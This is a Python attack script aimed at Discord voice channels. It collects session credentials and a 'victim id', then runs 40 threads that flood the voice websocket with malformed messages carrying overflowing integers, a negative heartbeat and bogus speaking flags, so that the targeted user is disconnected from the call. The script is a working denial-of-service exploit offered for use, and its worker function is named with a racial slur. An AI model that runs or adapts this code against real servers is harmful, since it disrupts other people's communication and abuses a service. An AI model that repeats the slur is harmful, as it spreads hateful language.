import json as js2,threading
import websocket

ws_server = input("websocket: ")
serverid = input("server id: ")
myuid = input("your user id: ")
vid = input("victim id (anyone in the vc): ")
sessionid = input("session id: ")
tokenn = input("token (not auth): ")
print("you should start disconnecting and reconnecting from the vc now, this means its working")
def nigger():
    while True:
        try:
            ws = websocket.create_connection(
                f"{ws_server}",
                origin=f"https://discord.com"
            )
            ws.recv()
            ws.send(js2.dumps(
                {"op":0,"d":{"server_id":f"{serverid}","user_id":f"{myuid}","session_id":f"{sessionid}","token":f"{tokenn}","video":True,"streams":[{"type":"video","rid":"100","quality":9223372036854775807},{"type":"video","rid":"50","quality":9223372036854775807}]}}
                , separators=(",", ":")
            ).encode("UTF-8"))
            ws.send(js2.dumps(
                {"op":12,"d":{"audio_ssrc":9223372036854775807,"video_ssrc":9223372036854775807,"rtx_ssrc":9223372036854775807,"streams":[{"type":"video","rid":"100","ssrc":9223372036854775807,"active":True,"quality":92233720368547758076,"rtx_ssrc":9223372036854775807,"max_bitrate":9223372036854775807,"max_framerate":9223372036854775807,"max_resolution":{"type":"fixed","width":9223372036854775807,"height":9223372036854775807}}]}},
            separators=(",", ":")
            ).encode("UTF-8"))
            ws.send(js2.dumps(
                {"op":8,"d":{"v":5,"heartbeat_interval":-1}},
                separators=(",", ":")
            ).encode("UTF-8"))
            ws.send(js2.dumps(
            {"op":5,"d":{"user_id":"810257712364519434","ssrc":9223372036854775807,"speaking":-1343346346346346}},
                separators=(",", ":")
            ).encode("UTF-8"))
            ws.send(js2.dumps(
                {"op":5,"d":{"speaking":9223372036854775807,"delay":9223372036854775807,"ssrc":9223372036854775807}},
            separators=(",", ":")
            ).encode("UTF-8"))
            ws.recv()
            ws.recv()
            print("sent payload")
            ws.close()
            print("websocket closed (not error)")
        except:
            pass

threads = []

for i in range(40):
    t = threading.Thread(target=nigger)
    t.daemon = True
    threads.append(t)

for i in range(40):
    threads[i].start()

for i in range(40):
    threads[i].join()